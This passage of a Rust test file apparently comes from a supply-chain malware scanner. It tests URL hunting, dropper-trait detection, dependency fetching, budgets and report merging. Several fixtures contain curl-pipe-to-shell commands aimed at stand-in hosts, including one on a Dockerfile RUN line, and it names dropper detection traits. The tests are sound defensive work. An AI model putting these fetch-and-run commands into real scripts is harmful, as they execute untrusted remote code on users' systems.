        .flat_map(|(sha, refs)| refs.iter().map(move |r| (sha, r)))
        .filter(|(_, reference)| reference.source == "ast-browser-pac-url")
        .collect();
    assert_eq!(matches.len(), 1, "{groups:?}");
    assert_eq!(matches[0].0, &owner);
    assert_eq!(locator(matches[0].1), "https://proxy.test/config.pac");
    assert!(
        !groups
            .iter()
            .flat_map(|(_, refs)| refs)
            .any(|r| locator(r).contains("docs.test"))
    );
    assert!(
        !groups
            .iter()
            .flat_map(|(_, refs)| refs)
            .any(|r| locator(r).contains("shadow.test"))
    );
}

#[test]
fn member_with_download_intent_is_hunted_for_spawned_urls() {
    let tmp = tempfile::tempdir().expect("tempdir");
    let root = write_tar_zst(
        tmp.path(),
        &[("pkg/src/lib.rs", RUST_DROPPER), ("pkg/README.md", README)],
    );
    let root_path = root.to_string_lossy().into_owned();
    let trigger =
        "objectives/command-and-control/dropper/execution/pipe::spawned-curl-pipe-shell-rce";
    let report: AnalysisReport = serde_json::from_value(serde_json::json!({
        "version": "3",
        "files": [
            { "id": 0, "path": root_path, "depth": 0, "file_type": "tar",
              "sha256": "aa".repeat(32), "size": 4096u64 },
            { "id": 1, "parent_id": 0, "path": format!("{root_path}!!pkg/src/lib.rs"),
              "depth": 1, "file_type": "rust", "sha256": "bb".repeat(32),
              "size": RUST_DROPPER.len() as u64,
              "findings": [
                  { "id": "micro-behaviors/process/create/system::rust-command" },
                  { "id": trigger }
              ] },
            // Same URL shape, no download-intent finding: never re-read.
            { "id": 2, "parent_id": 0, "path": format!("{root_path}!!pkg/README.md"),
              "depth": 1, "file_type": "markdown", "sha256": "cc".repeat(32),
              "size": README.len() as u64 }
        ]
    }))
    .expect("report deserializes");

    // Both paths must use the supplied artifact, even when the label or
    // fallback path points at a different archive with the same member.
    let other_dir = tempfile::tempdir().expect("other tempdir");
    let other = write_tar_zst(other_dir.path(), &[("pkg/src/lib.rs", README)]);
    let original = std::fs::read(&root).expect("read archive");
    let memory_groups =
        collect_references_from_input(&report, &other, Some(&original), CiRefs::Skip);
    assert!(
        memory_groups
            .iter()
            .flat_map(|(_, refs)| refs)
            .any(|r| locator(r) == "https://stage.test/bashlinux.sh")
    );
    assert!(
        !memory_groups
            .iter()
            .flat_map(|(_, refs)| refs)
            .any(|r| locator(r) == "https://docs.test/install.sh")
    );

    let groups = collect_references(&report, &root, CiRefs::Skip);
    let hunted: Vec<(&str, String, &str)> = groups
        .iter()
        .flat_map(|(sha, refs)| {
            refs.iter()
                .map(move |r| (sha.as_str(), locator(r).to_owned(), r.source.as_str()))
        })
        .collect();
    assert_eq!(
        hunted.len(),
        1,
        "only the flagged member is hunted: {hunted:?}"
    );
    let (sha, locator, source) = &hunted[0];
    assert_eq!(*sha, "bb".repeat(32));
    assert_eq!(locator, "https://stage.test/bashlinux.sh");
    assert!(
        !source.contains(trigger),
        "the recognizer's own source is kept, never rewritten: {source}"
    );
}

#[test]
fn in_memory_root_text_uses_supplied_bytes_not_path() {
    let tmp = tempfile::tempdir().expect("tempdir");
    let other = tmp.path().join("other.sh");
    std::fs::write(&other, b"curl https://wrong.test/payload.sh | sh\n").unwrap();
    let data = b"curl https://right.test/payload.sh | sh\n";
    let report: AnalysisReport = serde_json::from_value(serde_json::json!({
        "version": "3",
        "files": [{"id": 0, "path": "script.sh", "depth": 0, "file_type": "shell",
            "sha256": "aa".repeat(32), "size": data.len()}]
    }))
    .unwrap();
    let groups = collect_references_from_input(&report, &other, Some(data), CiRefs::Skip);
    let refs: Vec<_> = groups
        .iter()
        .flat_map(|(_, refs)| refs)
        .map(locator)
        .collect();
    assert!(
        refs.iter().any(|url| url.contains("right.test")),
        "{refs:?}"
    );
    assert!(
        !refs.iter().any(|url| url.contains("wrong.test")),
        "{refs:?}"
    );
}

#[test]
fn download_intent_prefers_the_most_specific_trait() {
    let findings: Vec<Finding> = serde_json::from_value(serde_json::json!([
        { "id": "micro-behaviors/process/create/direct::rust-command-curl-wget" },
        { "id": "micro-behaviors/process/create/shell/pipeline::curl-pipe-shell-text" },
        { "id": "objectives/command-and-control/dropper/execution/pipe::process-api-call" },
    ]))
    .expect("findings deserialize");
    assert_eq!(
        download_intent(&findings),
        Some("objectives/command-and-control/dropper/execution/pipe::process-api-call")
    );
    assert_eq!(
        download_intent(&findings[..1]),
        Some("micro-behaviors/process/create/direct::rust-command-curl-wget")
    );
    let benign: Vec<Finding> = serde_json::from_value(serde_json::json!([
        { "id": "micro-behaviors/process/create/system::rust-command" },
        { "id": "micro-behaviors/communications/http/url/path::image-file-url" },
    ]))
    .expect("findings deserialize");
    assert_eq!(download_intent(&benign), None);
}

#[test]
fn image_url_is_a_carrier_only_beside_stego_evidence() {
    let url = |u: &str| Reference::new(RefLocator::Url(u.into()), RefKind::UrlFetch, "rust", "");
    let report: AnalysisReport = serde_json::from_value(serde_json::json!({
            "version": "3",
            "files": [
                { "id": 0, "path": "loader.rs", "depth": 0, "file_type": "rust",
                  "sha256": "aa".repeat(32), "size": 1u64,
                  "findings": [{ "id": "objectives/command-and-control/dropper/execution/stego-loader::rust-downloaded-image-range-script-loader" }] },
                { "id": 1, "path": "README.md", "depth": 1, "file_type": "markdown",
                  "sha256": "bb".repeat(32), "size": 1u64,
                  "findings": [{ "id": "micro-behaviors/communications/http/url/path::image-file-url" }] },
                { "id": 2, "path": "install.sh", "depth": 1, "file_type": "shell",
                  "sha256": "cc".repeat(32), "size": 1u64,
                  "findings": [
                      { "id": "micro-behaviors/communications/http/url/path::image-file-url" },
                      { "id": "objectives/command-and-control/dropper/execution/pipe::curl-pipe-shell" }
                  ] }
            ]
        }))
        .expect("report deserializes");
    let groups = vec![
        (
            "aa".repeat(32),
            vec![
                url("https://stage.test/screenshot_2.png"),
                url("https://stage.test/index.html"),
            ],
        ),
        // An image URL with no carrier evidence: a README badge.
        (
            "bb".repeat(32),
            vec![url("https://img.shields.io/crates/v/tool.PNG")],
        ),
        // An image URL beside a dropper execution trait.
        (
            "cc".repeat(32),
            vec![url("https://stage.test/cover.JPG?v=2")],
        ),
    ];
    let carriers = image_carrier_urls(&report, &groups);
    assert_eq!(
        carriers,
        HashSet::from([
            "https://stage.test/screenshot_2.png".to_string(),
            "https://stage.test/cover.JPG?v=2".to_string(),
        ])
    );
    // Carrier or not, an ordinary image URL still fails the download shape.
    assert!(!dropper("https://img.shields.io/crates/v/tool.png"));
}

#[test]
fn collect_references_unions_declared_facts_and_root_hunt() {
    // Root Dockerfile on disk: its RUN curls a URL (imperative hunt) and it
    // also declares a package dependency (a filefacts fact in the report).
    let tmp = tempfile::tempdir().expect("tempdir");
    let df = tmp.path().join("Dockerfile");
    std::fs::write(
        &df,
        b"FROM alpine\nRUN curl -fsSL https://stage.test/x.sh | sh\n",
    )
    .expect("write dockerfile");
    let sha = "ab".repeat(32);
    // Minimal one-file report (FileAnalysis has no public constructor, so
    // build it by deserialization) declaring one package dependency.
    let report: AnalysisReport = serde_json::from_value(serde_json::json!({
        "version": "3",
        "files": [{
            "id": 0, "path": "root", "depth": 0, "file_type": "dockerfile",
            "sha256": sha, "size": 64u64,
            "filefacts": { "references": [{
                "locator": {"purl": "pkg:npm/declared-dep@1.0.0"},
                "kind": "dependency", "source": "test", "evidence": "declared", "offset": 0
            }]}
        }]
    }))
    .expect("minimal report deserializes");

    let groups = collect_references(&report, &df, CiRefs::Skip);
    assert_eq!(groups.len(), 1);
    let (gsha, refs) = &groups[0];
    assert_eq!(gsha, &sha);
    let locs: Vec<String> = refs.iter().map(|r| locator(r).to_owned()).collect();
    assert!(
        locs.iter().any(|l| l == "pkg:npm/declared-dep@1.0.0"),
        "declared dep retained: {locs:?}"
    );
    assert!(
        locs.iter().any(|l| l == "https://stage.test/x.sh"),
        "hunted RUN url merged in: {locs:?}"
    );
}

#[test]
fn merge_dedups_against_declared_and_creates_group_for_undeclared_root() {
    // Root declared one ref; the hunt finds that same one plus a new one.
    let mut groups = vec![("rootsha".to_string(), vec![url_ref("https://a.test/x")])];
    merge_into_root(
        &mut groups,
        "rootsha",
        vec![url_ref("https://a.test/x"), url_ref("https://b.test/y")],
    );
    assert_eq!(groups.len(), 1);
    assert_eq!(groups[0].1.len(), 2, "duplicate locator must not be added");

    // A root that declared nothing still receives a group from the hunt.
    let mut empty = Vec::new();
    merge_into_root(&mut empty, "rootsha", vec![url_ref("https://c.test/z")]);
    assert_eq!(
        empty,
        vec![("rootsha".to_string(), vec![url_ref("https://c.test/z")])]
    );
}

/// A fetched subtree is renamed to its locator — root and members alike — so
/// the merged report says where the bytes came from, and so two dependencies
/// whose URLs end in the same basename stay distinct. Anything keyed on path
/// (the dependency appendix walks a "<root>!!" prefix) merged them before.
#[test]
fn merge_payload_renames_the_subtree_to_its_locator() {
    let sub_report = |name: &str| -> AnalysisReport {
        serde_json::from_value(serde_json::json!({
            "version": "3",
            "files": [
                {"id": 0, "path": name, "depth": 0, "file_type": "npm",
                 "sha256": "d".repeat(64), "size": 64u64},
                {"id": 1, "parent_id": 0, "path": format!("{name}!!lib/a.js"), "depth": 1,
                 "file_type": "javascript", "sha256": "e".repeat(64), "size": 32u64},
            ],
        }))
        .expect("sub report")
    };
    let rec_for = |locator: &str, url: &str| FetchRecord {
        source_sha256: None,
        context: None,
        coverage: Vec::new(),
        source_offset: None,
        kind: RefKind::Dependency,
        locator: locator.to_string(),
        resolved_url: Some(url.to_string()),
        final_url: None,
        redirects: Vec::new(),
        status: None,
        headers: Vec::new(),
        fetched_at: None,
        content_sha256: Some("d".repeat(64)),
        size: None,
        served: Some(Served::Network),
        outcome: Outcome::Ok,
    };

    let mut report: AnalysisReport =
        serde_json::from_value(serde_json::json!({"version": "3", "files": []}))
            .expect("root report");
    let mut graft = Graft::new(&report);

    // Two dependencies whose URLs share a basename — the collision case.
    for (locator, url) in [
        ("pkg:npm/alpha@1.0.0", "https://a.test/index.js"),
        ("pkg:npm/beta@2.0.0", "https://b.test/index.js"),
    ] {
        merge_payload(
            &mut report,
            &mut graft,
            &rec_for(locator, url),
            Analyzed {
                sub: Some(sub_report("index.js")),
                content_sha: "d".repeat(64),
                next_from_bytes: Vec::new(),
                corpus: None,
            },
        );
    }

    let paths: Vec<&str> = report.files.iter().map(|f| f.path.as_str()).collect();
    assert!(
        paths.contains(&"pkg:npm/alpha@1.0.0") && paths.contains(&"pkg:npm/beta@2.0.0"),
        "each dependency root is named by its locator: {paths:?}",
    );
    assert!(
        paths.contains(&"pkg:npm/alpha@1.0.0!!lib/a.js")
            && paths.contains(&"pkg:npm/beta@2.0.0!!lib/a.js"),
        "members follow their root, so prefix lookups still reach them: {paths:?}",
    );
    assert!(
        !paths.iter().any(|p| p.starts_with("index.js")),
        "no node keeps the URL basename that made the two collide: {paths:?}",
    );
}

#[test]
fn payload_name_prefers_url_basename_then_falls_back_to_hash() {
    let mut rec = FetchRecord {
        source_sha256: None,
        context: None,
        coverage: Vec::new(),
        source_offset: None,
        kind: RefKind::Dependency,
        locator: "pkg:npm/x".to_string(),
        resolved_url: Some("https://reg.test/x/-/x-1.0.0.tgz".to_string()),
        final_url: None,
        redirects: Vec::new(),
        status: None,
        headers: Vec::new(),
        fetched_at: None,
        content_sha256: Some("abc123".to_string()),
        size: None,
        served: Some(Served::Network),
        outcome: Outcome::Ok,
    };
    assert_eq!(payload_name(&rec), "x-1.0.0.tgz");

    // Query string is stripped.
    rec.resolved_url = Some("https://reg.test/dl?file=stage2.sh".to_string());
    // basename before '?' is "dl" (path component), so query strip applies to it.
    assert_eq!(payload_name(&rec), "dl");
    // A slash in the query is not a path separator.
    rec.resolved_url = Some("https://reg.test/dl?f=a/stage2.sh".to_string());
    assert_eq!(payload_name(&rec), "dl");

    // No usable basename → content hash.
    rec.resolved_url = Some("https://reg.test/".to_string());
    assert_eq!(payload_name(&rec), "abc123");
}

fn report_of(files: &serde_json::Value) -> AnalysisReport {
    serde_json::from_value(serde_json::json!({"version": "3", "files": files}))
        .expect("report deserializes")
}

#[test]
fn registry_sources_are_released_before_payloads_finish() {
    for skip in [None, Some(SkipReason::AgedOut)] {
        for crit in [cleave::Criticality::Baseline, cleave::Criticality::Notable] {
            let record = crate::test_registry("npm", "fixture", "1");
            let body = format!(
                r#"{{"future_provider_field":"{}"}}"#,
                "history".repeat(50_000)
            )
            .into_bytes();
            let sources = vec![RecordedSource {
                url: "https://registry.example/fixture".to_string(),
                status: 200,
                content_type: Some("application/json".to_string()),
                size: body.len() as u64,
                bytes: Some(body),
            }];
            let expected = RegistryProvenance::from_record_sources(record.clone(), &sources)
                .document()
                .to_vec();
            let mut gated = Gated {
                reference: purl_ref("pkg:npm/fixture@1"),
                record,
                sources: Some(sources),
                provenance: None,
                skip,
            };
            let mut sub = report_of(&serde_json::json!([
                {"id":0,"path":"fixture.registry.json","depth":0,"file_type":"registry","sha256":"a".repeat(64),"size":1u64}
            ]));
            sub.files[0]
                .findings
                .push(test_finding("provider-finding", crit));
            gated.finish_registry_analysis(Some(&sub));
            assert!(
                gated.sources.is_none(),
                "raw responses must not wait for payload scans"
            );
            if skip.is_none() || crit >= cleave::Criticality::Notable {
                assert_eq!(gated.provenance.unwrap().document(), expected);
            } else {
                assert!(
                    gated.provenance.is_none(),
                    "ordinary skipped records need no raw provenance"
                );
            }
        }
    }
}

#[test]
fn absent_registry_analysis_drops_sources_and_memo_hits_stay_lazy() {
    let mut gated = Gated {
        reference: purl_ref("pkg:npm/fixture@1"),
        record: crate::test_registry("", "", ""),
        sources: Some(vec![RecordedSource {
            url: "https://registry.example/fixture".to_string(),
            status: 200,
            content_type: None,
            size: 2,
            bytes: Some(b"{}".to_vec()),
        }]),
        provenance: None,
        skip: None,
    };
    gated.finish_registry_analysis(None);
    assert!(gated.sources.is_none());
    assert!(gated.provenance.is_none());
    let sub = report_of(&serde_json::json!([
        {"id":0,"path":"fixture.registry.json","depth":0,"file_type":"registry","sha256":"a".repeat(64),"size":1u64}
    ]));
    gated.finish_registry_analysis(Some(&sub));
    assert!(
        gated.provenance.is_none(),
        "a memo hit must not fetch sources during analysis"
    );
}

/// The batch PURL negotiation's answer is its own case: nothing was
/// downloaded, yet an adopted verdict becomes a payload to merge, gets its
/// node, and carries its verdict. Dropping it as "no bytes" would keep the
/// verdict inside the group that negotiated it.
#[test]
fn a_corpus_answer_reaches_the_report_without_a_download() {
    let sha = "e".repeat(64);
    let source = "s".repeat(64);
    let landed = |standing: Standing| {
        let reference = purl_ref("pkg:npm/zaboodle@1.49");
        Landed {
            record: corpus_hit_record(&reference, &source, &sha),
            reference,
            standing,
        }
    };
    let dir = tempfile::tempdir().expect("tempdir");
    let cache = BlobCache::with_dir(dir.path().to_path_buf());
    let opts = AnalysisOptions::default();
    let payloads = Payloads {
        cache: &cache,
        opts: &opts,
        acache: None,
        precheck: None,
    };

    let adopted = landed(Standing::Adopt(Verdict {
        fires_at: crate::model::Level::At(2),
        reason: Some("steals tokens".to_string()),
        findings: Vec::new(),
        ..Default::default()
    }));
    let analyzed = payloads
        .analyze(&adopted)
        .expect("an adopted verdict is a payload to merge");
    assert_eq!(analyzed.content_sha, sha);
    assert!(analyzed.sub.is_none(), "nothing was downloaded or analyzed");
    assert_eq!(
        analyzed.corpus.as_ref().map(|v| v.fires_at),
        Some(crate::model::Level::At(2))
    );

    let mut report = report_of(&serde_json::json!([{
        "id": 0, "path": "package.json", "depth": 0,
        "file_type": "package_json", "sha256": source, "size": 100u64
    }]));
    let mut graft = Graft::new(&report);
    let next = merge_payload(&mut report, &mut graft, &adopted.record, analyzed);
    assert!(next.is_empty());
    let node = report
        .files
        .iter()
        .find(|f| f.sha256 == sha)
        .expect("the adopted dependency has a node");
    assert_eq!(node.path, "pkg:npm/zaboodle@1.49");
    assert_eq!(node.rel, cleave::types::Rel::Fetched);
    assert_eq!(node.parent_id, Some(0));

    // A benign answer from another analyzer carries nothing to report.
    assert!(payloads.analyze(&landed(Standing::SkipBenign)).is_none());
}

/// fletch returns records only for the references it fetches and may
/// refine a locator on the way; the index stamped going in still pairs
/// every record with its own reference. Pairing by position moved every
/// record after a skipped reference onto the wrong one.
#[test]
fn records_pair_with_their_references_by_key() {
    let mut path = purl_ref("unused");
    path.locator = RefLocator::Path("./lib/index.js".to_string());
    let mut b = purl_ref("pkg:npm/b");
    b.offset = Some(99);
    let selected = vec![purl_ref("pkg:npm/a"), path, b];
    // As fletch answers: nothing for the path, `b` refined to a release.
    let record = |i: usize, locator: &str| FetchRecord {
        source_offset: keyed(&selected[i], i).offset,
        locator: locator.to_string(),
        ..fetched_record()
    };
    let records = vec![record(0, "pkg:npm/a@1.0.0"), record(2, "pkg:npm/b@2.0.0")];
    let mut slots = vec![None; selected.len()];
    pair_records(&selected, records, &mut slots);
    assert_eq!(
        slots[0].as_ref().map(|(r, _)| r.locator.as_str()),
        Some("pkg:npm/a@1.0.0")
    );
    assert!(slots[1].is_none(), "the path was never fetched");
    let (record_b, standing) = slots[2].as_ref().expect("b keeps its own slot");
    assert_eq!(record_b.locator, "pkg:npm/b@2.0.0");
    assert_eq!(
        record_b.source_offset,
        Some(99),
        "the real offset is restored"
    );
    assert!(matches!(standing, Standing::Analyze));
}

/// Concurrent fetch phases reserve before the network, so together they
/// can never spend more than the process-wide budget.
#[test]
fn the_total_budget_is_reserved_not_overshot() {
    let total = TotalBudget::new(10, 1_000);
    let want = Allowance {
        fetches: 4,
        bytes: 400,
    };
    let granted: Vec<Allowance> = std::thread::scope(|scope| {
        let handles: Vec<_> = (0..8)
            .map(|_| scope.spawn(|| total.reserve(want)))
            .collect();
        handles
            .into_iter()
            .map(|h| h.join().expect("thread"))
            .collect()
    });
    assert_eq!(granted.iter().map(|g| g.fetches).sum::<usize>(), 10);
    assert_eq!(granted.iter().map(|g| g.bytes).sum::<u64>(), 1_000);
}

/// What a fetch did not spend goes back; bytes past its grant — fletch
/// stops only after the fetch that crossed the cap — come out of what is
/// left.
#[test]
fn a_grant_is_settled_against_what_was_spent() {
    let total = TotalBudget::new(10, 1_000);
    let all = Allowance {
        fetches: usize::MAX,
        bytes: u64::MAX,
    };
    let grant = total.reserve(Allowance {
        fetches: 4,
        bytes: 400,
    });
    total.settle(
        grant,
        Allowance {
            fetches: 1,
            bytes: 100,
        },
    );
    assert_eq!(
        total.reserve(all),
        Allowance {
            fetches: 9,
            bytes: 900
        }
    );
    let total = TotalBudget::new(5, 100);
    let grant = total.reserve(Allowance {
        fetches: 1,
        bytes: 10,
    });
    total.settle(
        grant,
        Allowance {
            fetches: 1,
            bytes: 30,
        },
    );
    assert_eq!(
        total.reserve(all),
        Allowance {
            fetches: 4,
            bytes: 70
        }
    );
}

/// One root's budget spans all its hops and declaring files: what an
/// earlier group spent is gone for the next, per class for the counts and
/// shared for the bytes.
#[test]
fn a_roots_budget_carries_across_groups() {
    let mut budget = RootBudget::new(&FetchPolicy {
        max_file_fetches: 10,
        max_url_fetches: 2,
        max_file_bytes: 100,
        ..FetchPolicy::default()
    });
    budget.spend(
        FetchClass::Deps,
        Allowance {
            fetches: 7,
            bytes: 60,
        },
    );
    assert_eq!(
        budget.want(FetchClass::Deps),
        Allowance {
            fetches: 3,
            bytes: 40
        }
    );
    assert_eq!(
        budget.want(FetchClass::Urls),
        Allowance {
            fetches: 2,
            bytes: 40
        }
    );
    budget.spend(
        FetchClass::Urls,
        Allowance {
            fetches: 5,
            bytes: 90,
        },
    );
    assert_eq!(
        budget.want(FetchClass::Urls),
        Allowance {
            fetches: 0,
            bytes: 0
        }
    );
}

#[test]
fn a_purl_coordinate_splits_once() {
    let c = Coordinate::of("pkg:npm/%40scope/name@1.2.3?arch=x64#sub").unwrap();
    assert_eq!(
        (c.key, c.typ, c.path, c.version),
        (
            "pkg:npm/%40scope/name",
            "npm",
            "%40scope/name",
            Some("1.2.3")
        )
    );
    // A literal scope `@` opens a segment; it is never a version.
    assert_eq!(Coordinate::of("pkg:npm/@scope/name").unwrap().version, None);
    assert_eq!(
        Coordinate::of("pkg:npm/@scope/name@2.0.0").unwrap().key,
        "pkg:npm/@scope/name"
    );
    // Qualifiers are not part of the version.
    assert_eq!(
        Coordinate::of("pkg:cargo/serde@1.0.219?checksum=abc")
            .unwrap()
            .version,
        Some("1.0.219")
    );
    assert!(Coordinate::of("https://example.test/x@1.zip").is_none());
    assert!(Coordinate::of("pkg:npm").is_none());
    // Every reader shares the one split.
    assert_eq!(versioned_purl("https://example.test/x@1.zip"), None);
    assert_eq!(
        purl_display("pkg:npm/%40scope/pkg@1.2.3"),
        "@scope/pkg 1.2.3"
    );
    assert_eq!(purl_display("pkg:npm/%40scope/pkg"), "@scope/pkg");
    assert_eq!(
        npm_import_name(&purl_ref("pkg:npm/%40scope/tool")).as_deref(),
        Some("@scope/tool")
    );
    assert_eq!(npm_import_name(&purl_ref("pkg:pypi/requests")), None);
}

/// The graft index is what a scan of the report would find: ids continue
/// past the highest, and a parent is the first node with the declaring sha.
#[test]
fn the_graft_index_matches_a_scan_of_the_report() {
    let (a, b) = ("a".repeat(64), "b".repeat(64));
    let mut report = report_of(&serde_json::json!([
        {"id": 0, "path": "root", "depth": 0, "file_type": "tar", "sha256": a, "size": 1u64},
        {"id": 5, "parent_id": 0, "path": "root!!m", "depth": 1, "file_type": "json", "sha256": b, "size": 1u64},
        {"id": 2, "parent_id": 5, "path": "root!!m!!n", "depth": 3, "file_type": "json", "sha256": a, "size": 1u64},
    ]));
    let mut graft = Graft::new(&report);
    assert_eq!(graft.next_id, 6);
    assert_eq!(
        graft.parent(Some(&a)),
        (0, 0),
        "the first node with the sha"
    );
    assert_eq!(graft.parent(Some(&b)), (5, 1));
    assert_eq!(
        graft.parent(Some("unknown")),
        (0, 0),
        "falls back to the root"
    );
    assert_eq!(graft.parent(None), (0, 0), "as does no declarer at all");

    let sub = report_of(&serde_json::json!([
        {"id": 0, "path": "x@1.registry.json", "depth": 0, "file_type": "registry", "sha256": "c".repeat(64), "size": 1u64},
        {"id": 1, "parent_id": 0, "path": "x@1.registry.json!!y", "depth": 1, "file_type": "json", "sha256": "d".repeat(64), "size": 1u64},
    ]));
    assert_eq!(merge_registry(&mut report, &mut graft, &b, sub), Some(6));
    let grafted: Vec<(u32, Option<u32>, u32)> = report.files[3..]
        .iter()
        .map(|f| (f.id, f.parent_id, f.depth))
        .collect();
    assert_eq!(grafted, [(6, Some(5), 2), (7, Some(6), 3)]);
    assert_eq!(graft.next_id, 8);
}
